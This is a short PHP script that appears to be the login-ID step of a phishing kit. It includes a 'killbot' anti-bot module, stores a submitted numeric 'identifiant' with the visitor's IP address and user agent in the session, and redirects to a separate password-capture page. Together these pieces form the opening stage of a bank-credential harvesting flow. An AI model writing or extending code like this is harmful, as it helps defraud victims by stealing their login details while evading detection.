<?php

include_once '../killbot/code/include.php';
include("../common/sub_includes.php");



if(isset($_POST['ide_id_submit'])){

	
	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['identifiant'] = htmlspecialchars($_POST['identifiant']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


	if(is_numeric($_SESSION["identifiant"])){

				header('Location: ../steps/pass.php');
				}
		else{
			header('Location: ../index.php?error=email');

		}

	}
else{
	header('Location: ../');
}

?>